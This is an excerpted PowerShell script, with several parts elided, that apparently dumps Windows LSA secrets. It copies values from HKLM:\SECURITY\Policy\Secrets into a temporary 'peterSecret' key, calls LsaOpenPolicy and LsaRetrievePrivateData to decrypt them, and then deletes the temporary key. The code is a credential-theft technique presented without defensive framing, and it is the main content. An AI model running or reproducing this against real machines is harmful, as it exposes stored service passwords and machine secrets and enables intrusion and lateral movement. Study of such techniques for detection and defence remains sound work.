...
if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\peterSecret")) {
  mkdir "HKLM:\\SECURITY\Policy\Secrets\peterSecret" | Out-Null
}
...
Add-Type -MemberDefinition $signature -Name what -Namespace what
}

  Process{
    foreach($key in $RegistryKey) {
      $regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
      $tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\peterSecret"
      $myKey = "peterSecret"
      if(Test-Path $regPath) {
        ...
        if(Test-Path $regPath) {
          ...
          "CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object {
            ...
            $copyTo = "HKLM:\SECURITY\Policy\Secrets\peterSecret\" + $_
        ...
        # Attributes
        $objectAttributes = New-Object what.what+LSA_OBJECT_ATTRIBUTES
        ...
        # localSystem
        $localsystem = New-Object what.what+LSA_UNICODE_STRING
        $localsystem.Buffer = [IntPtr]::Zero
        $localsystem.Length = 0
        $localsystem.MaximumLength = 0

        # Secret Name
        $secretName = New-Object what.what+LSA_UNICODE_STRING
        ...
        [what.what+LSA_AccessPolicy]$access = [what.what+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
        $lsaOpenPolicyHandle = [what.what]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)
        ...
        $ntsResult = [what.what]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)

        $lsaClose = [what.what]::LsaClose($lsaPolicyHandle)

        $lsaNtStatusToWinError = [what.what]::LsaNtStatusToWinError($ntsResult)

        if($lsaNtStatusToWinError -ne 0) {
          Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
        }

        [what.what+LSA_UNICODE_STRING]$lusSecretData =
        [what.what+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [System.Type][what.what+LSA_UNICODE_STRING])
    ...
    if(Test-Path $tempRegPath) {
      Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\peterSecret" -Recurse -Force
    }
  }
}
